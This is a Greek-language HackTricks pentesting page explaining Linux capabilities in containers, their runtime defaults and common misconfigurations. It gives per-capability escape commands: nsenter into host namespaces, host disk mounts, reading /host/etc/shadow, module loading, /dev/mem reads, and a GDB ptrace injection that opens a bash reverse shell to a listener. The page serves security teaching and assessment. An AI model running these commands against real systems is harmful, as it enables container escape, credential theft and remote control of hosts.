# Δυνατότητες Linux σε Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι δυνατότητες Linux είναι ένα από τα σημαντικότερα στοιχεία της ασφάλειας των containers, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το «root» μέσα σε ένα container;** Σε ένα συνηθισμένο σύστημα Linux, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο προνομίων. Στους σύγχρονους kernels, αυτά τα προνόμια διαχωρίζονται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ’ όλα αυτά να μην μπορεί να εκτελέσει πολλές ισχυρές λειτουργίες, αν έχουν αφαιρεθεί οι σχετικές capabilities. <sup>[[1]](#references)</sup>

Τα containers βασίζονται σε μεγάλο βαθμό σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να εκκινούνται ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Όταν αφαιρούνται capabilities, μια διεργασία root μέσα σε container μπορεί να εξακολουθεί να εκτελεί πολλές συνηθισμένες εργασίες εντός του container, ενώ δεν της επιτρέπονται πιο ευαίσθητες λειτουργίες του kernel. Γι’ αυτό, ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα «root στο host» ή ακόμη και «ευρεία πρόσβαση στον kernel». Τα σύνολα capabilities καθορίζουν πόση πραγματική ισχύ έχει αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα κατάχρησής τους, δείτε:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Λειτουργία

Οι capabilities παρακολουθούνται σε διάφορα σύνολα, όπως τα permitted, effective, inheritable, ambient και bounding sets. Σε πολλές αξιολογήσεις containers, η ακριβής σημασιολογία κάθε συνόλου στον kernel είναι λιγότερο σημαντική από το τελικό πρακτικό ερώτημα: **ποιες προνομιούχες λειτουργίες μπορεί να εκτελέσει επιτυχώς αυτή η διεργασία τώρα και ποια μελλοντική απόκτηση προνομίων εξακολουθεί να είναι δυνατή;** <sup>[[1]](#references)</sup>

Αυτό έχει σημασία επειδή πολλές τεχνικές απόδρασης από container είναι στην πραγματικότητα προβλήματα capabilities που μεταμφιέζονται σε προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος των λειτουργιών του kernel, τις οποίες μια συνηθισμένη διεργασία root σε container δεν θα έπρεπε να χρησιμοποιεί. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το network namespace του host. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να βλέπει διεργασίες του host μέσω κοινής χρήσης του PID namespace του host. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`· στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το σύνολο capabilities δεν μπορεί να αξιολογηθεί μεμονωμένα. Πρέπει να εξετάζεται σε συνδυασμό με τα namespaces, το seccomp και την πολιτική MAC.

## Εργαστήριο

Ένας πολύ άμεσος τρόπος για να ελέγξετε τις capabilities μέσα σε ένα container είναι:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα στο οποίο έχουν προστεθεί όλα τα capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Για να δείτε την επίδραση μιας περιορισμένης προσθήκης, δοκιμάστε να απορρίψετε τα πάντα και να προσθέσετε ξανά μόνο μία capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν αλλάζει απλώς την τιμή ενός boolean με όνομα «privileged». Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.

## Capabilities Υψηλού Κινδύνου

Τα capabilities γίνονται primitives διαφυγής μόνο όταν η λειτουργία τους φτάνει σε έναν **πόρο που ελέγχεται από το host**. Οι συνδυασμοί υψηλού κινδύνου που εμφανίζονται συχνότερα είναι:

- **`CAP_SYS_ADMIN`** μαζί με ένα host PID, μια συσκευή block ή μια διαδρομή εγγραφής σε στοιχεία ελέγχου του kernel. Για την ένταξη σε ένα target mount namespace απαιτείται επιπλέον το `CAP_SYS_CHROOT`· για την προσάρτηση ενός filesystem που βασίζεται σε block απαιτείται το `CAP_SYS_ADMIN` στο αρχικό user namespace.
- **`CAP_SYS_PTRACE`** μαζί με ορατότητα στα host PID και μια host διεργασία στην οποία μπορεί να γίνει attach. Το `CAP_SYS_ADMIN` δεν απαιτείται για ptrace injection.
- **`CAP_DAC_OVERRIDE` ή `CAP_DAC_READ_SEARCH`** μαζί με πρόσβαση σε ένα host filesystem. Αυτά τα capabilities παρακάμπτουν διαφορετικούς ελέγχους DAC, αλλά δεν δημιουργούν ορατότητα σε host filesystem.
- **`CAP_SYS_MODULE`** στο αρχικό user namespace μαζί με ένα αποδεκτό module συμβατό με τον kernel. Τα συνηθισμένα Linux containers μοιράζονται τον kernel του node· τα runtimes VM ή userspace-kernel αλλάζουν αυτό το όριο.
- **`CAP_MKNOD`** στο αρχικό user namespace μαζί με μια πραγματική host συσκευή την οποία επιτρέπει ήδη το device cgroup. Η δημιουργία ενός node δεν παρακάμπτει το device cgroup.
- **`CAP_SYS_RAWIO`** μαζί με ένα εκτεθειμένο και λειτουργικό interface μνήμης, θυρών I/O, PCI ή ελέγχου συσκευών.
- **`CAP_SYS_BOOT`** μαζί με το αρχικό PID namespace για επανεκκίνηση του host ή με μια λειτουργική και επιτρεπόμενη διαδρομή kexec για αντικατάσταση του kernel.
- **`CAP_NET_ADMIN`** στο host network namespace για άμεσο έλεγχο της κατάστασης δικτύου του node. Το **`CAP_NET_RAW`** μπορεί να συμμετέχει σε escape συγκεκριμένου πρωτοκόλλου, αλλά τα raw sockets από μόνα τους δεν παρέχουν shell στο node.

Το `CAP_SYS_CHROOT` δεν αναφέρεται σκόπιμα ως αυτόνομο capability διαφυγής. Μπορεί να απαιτείται από το `setns()` σε mount namespace και να διευκολύνει τη χρήση ενός host tree στο οποίο υπάρχει ήδη πρόσβαση, αλλά το `chroot()` από μόνο του ούτε εκθέτει αυτό το tree ούτε παρέχει νέα δικαιώματα filesystem. Παρομοίως, τα `CAP_BPF` και `CAP_PERFMON` εκθέτουν ισχυρές δυνατότητες telemetry και επιφάνεια επίθεσης του kernel, αλλά, χωρίς ξεχωριστό kernel flaw, οι συνήθεις λειτουργίες τους δεν αποτελούν γενικούς τρόπους διαφυγής από container.

## Χρήση από Runtimes

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν όλα ελέγχους capabilities, αλλά οι προεπιλογές και τα interfaces διαχείρισης διαφέρουν. Το Docker τα εκθέτει απευθείας μέσω flags όπως τα `--cap-drop` και `--cap-add`. Το Podman παρέχει παρόμοιους ελέγχους και συχνά τους συνδυάζει με rootless εκτέλεση ως πρόσθετο επίπεδο ασφάλειας. Το Kubernetes παρέχει προσθήκες και αφαιρέσεις capabilities μέσω του `securityContext` του Pod ή του container· τα runtimes χαμηλότερου επιπέδου αποτυπώνουν τα resulting sets στη διαμόρφωση runtime του OCI. Τα περιβάλλοντα system-container, όπως τα LXC και Incus, βασίζονται επίσης στον έλεγχο capabilities, αλλά η ευρύτερη ενσωμάτωσή τους με το host μπορεί να δελεάσει τους operators να χαλαρώσουν τις προεπιλογές περισσότερο απ’ ό,τι θα έκαναν για ένα application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Η ίδια αρχή ισχύει για όλα: το ότι είναι τεχνικά δυνατό να δοθεί ένα capability δεν σημαίνει απαραίτητα ότι πρέπει να δοθεί. Πολλά περιστατικά στον πραγματικό κόσμο ξεκινούν όταν ένας operator προσθέτει ένα capability απλώς επειδή ένα workload απέτυχε με αυστηρότερη διαμόρφωση και η ομάδα χρειαζόταν μια γρήγορη λύση.

## Λανθασμένες Διαμορφώσεις

Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μόνο. Στην πράξη, συχνότερο πρόβλημα είναι η παραχώρηση ενός ή δύο εξαιρετικά ισχυρών capabilities, ειδικά του `CAP_SYS_ADMIN`, για να «λειτουργήσει η εφαρμογή», χωρίς να λαμβάνονται υπόψη οι επιπτώσεις στα namespaces, στο seccomp και στα mounts. Ένα άλλο συνηθισμένο πρόβλημα είναι ο συνδυασμός πρόσθετων capabilities με κοινή χρήση host namespaces. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes, η αντίστοιχη έκθεση εμφανίζεται συνήθως μέσω ρυθμίσεων workload όπως οι `hostPID: true` ή `hostNetwork: true`. Κάθε τέτοιος συνδυασμός αλλάζει το τι μπορεί πραγματικά να επηρεάσει το capability.

Είναι επίσης συνηθισμένο οι διαχειριστές να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να υπόκειται σε ουσιαστικούς περιορισμούς. Μερικές φορές ισχύει, αλλά άλλες φορές η πραγματική κατάσταση είναι ήδη τόσο κοντά στο privileged, ώστε η διάκριση παύει να έχει λειτουργική σημασία.

## Κατάχρηση

Ξεκινήστε καταγράφοντας τα ενεργά sets, την αντιστοίχιση user namespace, την κατάσταση του seccomp, τα namespaces, τα mounts και τις συσκευές. Ένα όνομα capability χωρίς αυτό το πλαίσιο δεν αποδεικνύει διαφυγή:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces και συσκευές block

Με ορατότητα στα PID του host, το `CAP_SYS_ADMIN` μπορεί να εισέλθει στα namespaces του host. Η λειτουργία mount namespace χρειάζεται επίσης `CAP_SYS_CHROOT` στο user namespace του καλούντος.

**Έλεγχος του capability και του confinement:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Καταγράψτε τον στόχο:** επιβεβαιώστε την κοινή χρήση του PID του host από τη διαμόρφωση του container/Pod ή από μια αναμφισβήτητη λίστα διεργασιών του host και, στη συνέχεια, επιθεωρήστε τα namespaces του στόχου. Υπάρχει τοπικό PID 1 και σε ιδιωτικά PID namespaces, επομένως η παρουσία του από μόνη της δεν αποδεικνύει κοινή χρήση του PID του host.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Εκμεταλλευτείτε τη διαδρομή namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Οι έλεγχοι capabilities πρέπει να πετυχαίνουν στα user namespaces που έχουν στην κατοχή τους τους στόχους. Το `--pid=host` ή το Kubernetes `hostPID: true` παρέχει ορατότητα· δεν παρέχει τα capabilities.

Για την εναλλακτική διαδρομή block-device, **enumerate** τους υποψήφιους και έπειτα **exploit** το προσβάσιμο filesystem κάνοντας πρώτα mount τον επικυρωμένο υποψήφιο μόνο για ανάγνωση:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Ο κόμβος συσκευής πρέπει να υπάρχει, το device cgroup πρέπει να το επιτρέπει και οι προσαρτήσεις block filesystem απαιτούν `CAP_SYS_ADMIN` στο αρχικό user namespace. Αν το root του host έχει ήδη προσαρτηθεί με bind στο `/host`, υπάρχει πρόσβαση στον host **χωρίς** `CAP_SYS_ADMIN`· το `chroot /host` είναι απλώς μια διευκόλυνση και απαιτεί ξεχωριστά `CAP_SYS_CHROOT`.

### Προσβάσιμο root του host: άμεση εκτέλεση από το filesystem

Αν το root του host έχει ήδη προσαρτηθεί στο `/host`, επιβεβαίωσε πρώτα την προσάρτηση και μετά χρησιμοποίησε απευθείας την υπάρχουσα πρόσβαση. Αυτή η διαδρομή δεν εξαρτάται από το `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Αν το `chroot()` δεν είναι διαθέσιμο, αλλά το δυαδικό αρχείο του host είναι συμβατό με την αρχιτεκτονική και τον φορτωτή του container, συχνά μπορεί να κληθεί μέσω του προσαρτημένου δέντρου:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Οι άμεσες αναγνώσεις και εγγραφές στο `/host` συνιστούν ήδη παραβίαση του host filesystem. Το `chroot()` ή η εκτέλεση ενός host binary απλώς διευκολύνουν αυτή την πρόσβαση· καμία από τις δύο ενέργειες δεν προσαρτά το host ούτε παρακάμπτει ένα read-only mount ή μια πολιτική MAC.

### `CAP_SYS_PTRACE`: host-process injection

Με ορατότητα στις διεργασίες του host και `CAP_SYS_PTRACE` στο user namespace του στόχου, το GDB μπορεί να κάνει μια εγκεκριμένη διεργασία του host να καλέσει τη `system()`. Δεν απαιτείται `CAP_SYS_ADMIN`.

**Έλεγχος του capability και των στοιχείων ελέγχου προσάρτησης:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Καταγράψτε και επιλέξτε έναν αναλώσιμο στόχο:** επιβεβαιώστε από τη διαμόρφωση ή από μια σαφή λίστα διεργασιών του node ότι γίνεται κοινή χρήση των PID του host· μην επιλέξετε ποτέ το PID 1 ή μια κρίσιμη υπηρεσία.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit την επιλεγμένη διεργασία:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Ο στόχος πρέπει να επιτρέπει attach και να διαθέτει αξιοποιήσιμο σύμβολο `system()` και διαδρομή Bash payload. Τα Yama, non-dumpable state, seccomp, user namespaces και MAC policy μπορούν να εμποδίσουν την αλυσίδα. Το GDB σταματά τον στόχο όσο είναι attached, οπότε χρησιμοποιήστε μόνο μια προσωρινή εργαστηριακή διεργασία.

### `CAP_DAC_OVERRIDE` και `CAP_DAC_READ_SEARCH`: προστατευμένα αρχεία του host

Αυτές οι capabilities δεν εκθέτουν το filesystem του host. Αν το `/host` είναι ήδη mount του host, η `CAP_DAC_READ_SEARCH` μπορεί να παρακάμψει τους ελέγχους DAC για ανάγνωση/αναζήτηση και η `CAP_DAC_OVERRIDE` μπορεί επιπλέον να παρακάμψει τους συνήθεις ελέγχους εγγραφής:

**Ελέγξτε τις capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Καταγράψτε το εκτεθειμένο σύστημα αρχείων του host και τα δικαιώματα του στόχου:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Δοκιμάστε τις παρακάμψεις ανάγνωσης και εγγραφής** σε ένα προσωρινό εργαστήριο:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Ένα mount μόνο για ανάγνωση και οι κανόνες LSM εξακολουθούν να ισχύουν. Το `CAP_DAC_READ_SEARCH` επιτρέπει επίσης τη χρήση του `open_by_handle_at()`, αλλά ένα breakout όπως το Shocker απαιτεί επιπλέον ένα file descriptor mount για το ίδιο υποκείμενο filesystem, έγκυρα ή εντοπίσιμα handles, συμβατή διάταξη filesystem/storage και να μην υπάρχει αποκλεισμός από το runtime ή το LSM. Δεν παρέχει αυθαίρετη πρόσβαση σε κάθε filesystem έξω από το mount namespace.

### `CAP_SYS_MODULE`: εκτέλεση στον κοινόχρηστο kernel

Σε ένα συνηθισμένο Linux container, ένα αποδεκτό module εκτελείται στον κοινόχρηστο kernel του host.

**Έλεγχος του capability και του πεδίου εφαρμογής του user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Απαριθμήστε τις προϋποθέσεις φόρτωσης modules:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Εκτελέστε exploit μόνο με συμβατό, προελεγμένο module απόδειξης σε αναλώσιμο node:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Η capability πρέπει να είναι ενεργή στο αρχικό user namespace. Η έκδοση και η ρύθμιση του kernel, οι υπογραφές των modules, το lockdown, το seccomp και η πολιτική LSM πρέπει να επιτρέπουν τη φόρτωση. Τα Kata, gVisor, Hyper-V isolation και παρόμοια runtimes αλλάζουν το όριο kernel στο οποίο φτάνει το workload.

### `CAP_MKNOD`: δημιουργία επιτρεπόμενου device handle

Το `CAP_MKNOD` δημιουργεί ένα device node, αλλά δεν παρακάμπτει το device cgroup. Η δημιουργία συσκευών δεν είναι namespaced, επομένως η capability πρέπει να είναι ενεργή στο αρχικό user namespace.

**Έλεγχος της capability και του scope του user namespace:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Καταγράψτε τις πραγματικές συσκευές, τους αριθμούς major/minor και τυχόν ορατή allowlist του cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit ενός επικυρωμένου υποψηφίου της οικογένειας ext σε λειτουργία μόνο για ανάγνωση:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Άλλα filesystems χρειάζονται ένα αντίστοιχο read-only εργαλείο· για την προσάρτηση της συσκευής απαιτείται επίσης `CAP_SYS_ADMIN`. Το `Operation not permitted` κατά το άνοιγμα του κόμβου που δημιουργήθηκε συνήθως υποδεικνύει ότι το device cgroup εξακολουθεί να αποκλείει την πρόσβαση. Στο cgroup v2, η πρόσβαση στις συσκευές επιβάλλεται συνήθως μέσω BPF και δεν υπάρχει αρχείο `devices.list`, επομένως το επιτυχές άνοιγμα είναι η καθοριστική δοκιμή.

### `CAP_SYS_RAWIO`: εκτεθειμένη διεπαφή raw-I/O

Δεν υπάρχει φορητό, γενικής χρήσης payload: οι έγκυρες διευθύνσεις και τα αποτελέσματα εξαρτώνται από το υλικό και τη διαμόρφωση του kernel.

**Ελέγξτε το capability και το εύρος του user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Καταγράψτε τις εκτεθειμένες ακατέργαστες διεπαφές, το υλικό και τα προγράμματα οδήγησης:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Κάντε exploit μόνο με εγκεκριμένη απόδειξη για την ταυτοποιημένη συσκευή και το εύρος διευθύνσεων.** Αν το `/dev/mem` είναι η εγκεκριμένη διεπαφή για το εργαστήριο, αυτό το πρότυπο αποδεικνύει την αποκάλυψη μνήμης κόμβου χωρίς να εκτυπώνει τα περιεχόμενά της:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Η διεύθυνση πρέπει να προέρχεται από τον χάρτη υλικού του lab, επειδή η ανάγνωση ορισμένων περιοχών MMIO μπορεί να έχει παρενέργειες. Μια γενική εντολή εγγραφής μνήμης θα ήταν παραπλανητική και μη ασφαλής: η ίδια διεύθυνση μπορεί να είναι ακίνδυνη σε ένα μηχάνημα και να ελέγχει υλικό ή μνήμη του kernel σε άλλο. Τα device cgroups, τα δικαιώματα filesystem, η αυστηρή ρύθμιση του `/dev/mem`, το kernel lockdown, η εικονικοποίηση και οι πολιτικές LSM συχνά εμποδίζουν την ουσιαστική πρόσβαση.

### `CAP_SYS_BOOT`: επανεκκίνηση namespace ή αντικατάσταση kernel

Σε ένα ιδιωτικό PID namespace, η `reboot()` τερματίζει τη διεργασία init αυτού του namespace αντί να επανεκκινεί το host. Επομένως, για να επηρεαστεί η επανεκκίνηση του host, απαιτείται το αρχικό PID namespace, συνήθως μέσω κοινής χρήσης του host PID. Μια διαδρομή kexec απαιτεί επίσης συμβατή εικόνα kernel και επιτρεπτική πολιτική lockdown/υπογραφών:

**Έλεγχος της δυνατότητας:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Καταγράψτε τις προϋποθέσεις για PID-namespace και kexec:** επιβεβαιώστε την κοινή χρήση PID του host από τη διαμόρφωση του workload, επειδή ένας σύνδεσμος προς PID namespace από μόνος του δεν αποκαλύπτει αν πρόκειται για το αρχικό namespace του node.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Εκτέλεσε exploit μόνο όταν η επανεκκίνηση ενός αναλώσιμου κόμβου εργαστηρίου αποτελεί τη ρητή άσκηση:**

```bash
sync
reboot -f
```

Μην εκτελέσετε αυτήν την εντολή και μην φορτώσετε kernel σε κοινόχρηστο node μόνο και μόνο για να αποδείξετε την capability. Σε ένα ιδιωτικό PID namespace, τερματίζει μόνο τη διεργασία init αυτού του namespace και δεν αποδεικνύει επίδραση στο host.

### `CAP_NET_ADMIN` και `CAP_NET_RAW`: διαδρομές δικτύου του host

Η `CAP_NET_ADMIN` επηρεάζει μόνο το τρέχον network namespace.

**Ελέγξτε τις capabilities και τον περιορισμό πρόσβασης:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Απαριθμήστε το τρέχον δίκτυο και επιβεβαιώστε τη δικτύωση host από τη διαμόρφωση του workload:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Δοκιμάστε το `CAP_NET_ADMIN` με αναστρέψιμο τρόπο:** με host networking, η προσωρινή διεπαφή είναι διεπαφή του κόμβου.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` επιτρέπει RAW και PACKET sockets, αλλά δεν παρέχει ένα γενικό κέλυφος στο host. Για να **καταγράψετε** την τεκμηριωμένη αλυσίδα GCE, ελέγξτε τη διαδρομή metadata και καταγράψτε αν είναι παρατηρήσιμη η κίνηση guest-agent σε plaintext:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Αν υπάρχουν οι αντίστοιχες προϋποθέσεις, **εκμεταλλεύσου** την αλυσίδα που εξαρτάται από το περιβάλλον, όπως περιγράφεται στο [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): κατέγραψε το αίτημα και την κατάσταση της ακολουθίας, εισήγαγε την πλαστογραφημένη απόκριση metadata που περιέχει ένα SSH key και, στη συνέχεια, επαλήθευσε την πρόσβαση στο host. Η αλυσίδα απαιτούσε root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, μη κρυπτογραφημένη κίνηση προς τα GCE metadata και ένα αίτημα guest-agent που μπορούσε να αποτελέσει αντικείμενο race condition· σύγχρονα πρωτόκολλα μεταφοράς ή συμπεριφορά agent μπορεί να την εμποδίσουν.

### Περιορισμοί τοπικής προέλευσης και διευθύνσεις διεπαφών

Ένας listener μπορεί να απορρίπτει συνδέσεις με διεύθυνση προέλευσης `127.0.0.1`, αλλά να παραβλέπει μια άλλη διεύθυνση που έχει εκχωρηθεί στο ίδιο network namespace. Αν ο listener είναι προσβάσιμος από εκείνη τη διεπαφή, σύγκρινε μια σύνδεση loopback με μία που δεσμεύεται σε υπάρχουσα μη loopback τοπική διεύθυνση. Το `CAP_NET_ADMIN` μπορεί να επιτρέπει τη ρύθμιση διεπαφών στο τρέχον namespace, αλλά δεν χρειάζεται αν έχει ήδη εκχωρηθεί κατάλληλη διεύθυνση. Το `CAP_NET_RAW` δεν αποτελεί προϋπόθεση για μια συνηθισμένη σύνδεση TCP. Πρόκειται για αστοχία ταξινόμησης διεύθυνσης προέλευσης, όχι για διαφυγή από container ούτε για απόδειξη ότι η εφαρμογή θα εξουσιοδοτήσει ένα προνομιούχο αίτημα.<sup>[[1]](#references)[[7]](#references)</sup>

Για έναν WebSocket listener, μια έγκυρη απόκριση HTTP `101 Switching Protocols` επιβεβαιώνει ότι ολοκληρώθηκε το handshake έναρξης· ένα επακόλουθο σφάλμα σε επίπεδο εφαρμογής μπορεί να δείχνει ότι η σύνδεση έφτασε στον handler. Καμία από τις δύο αποκρίσεις δεν αποδεικνύει ότι ο έλεγχος ταυτότητας ή η ζητούμενη λειτουργία ολοκληρώθηκε με επιτυχία.<sup>[[8]](#references)</sup>

## Έλεγχοι

Σκοπός των ελέγχων capabilities δεν είναι μόνο η εμφάνιση ακατέργαστων τιμών, αλλά και η κατανόηση του κατά πόσο η διεργασία έχει αρκετά προνόμια ώστε η τρέχουσα κατάσταση namespace και mount να είναι επικίνδυνη.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Τι είναι ενδιαφέρον εδώ:

- Το `capsh --print` είναι ο ευκολότερος τρόπος να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` δείχνει ποιες capabilities είναι πραγματικά ενεργές τώρα, όχι απλώς ποιες μπορεί να είναι διαθέσιμες σε άλλα sets.
- Η καταγραφή των capabilities αποκτά πολύ μεγαλύτερη σημασία αν το container μοιράζεται επίσης τα host PID, network ή user namespaces, ή έχει εγγράψιμα host mounts.

Αφού συλλέξετε τις ακατέργαστες πληροφορίες για τα capabilities, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η διεργασία είναι root, αν είναι ενεργά τα user namespaces, αν γίνεται κοινή χρήση των host namespaces, αν το seccomp επιβάλλεται και αν το AppArmor ή το SELinux εξακολουθούν να περιορίζουν τη διεργασία. Το σύνολο των capabilities από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά εξηγεί γιατί λειτουργεί ένα container breakout και ένα άλλο αποτυγχάνει, παρότι φαίνεται να ξεκινούν από την ίδια κατάσταση.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητες αποδυναμώσεις |
| --- | --- | --- | --- |
| Docker Engine | Περιορισμένο σύνολο capabilities από προεπιλογή | Το Docker διατηρεί μια προεπιλεγμένη λίστα επιτρεπόμενων capabilities και αφαιρεί τις υπόλοιπες | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
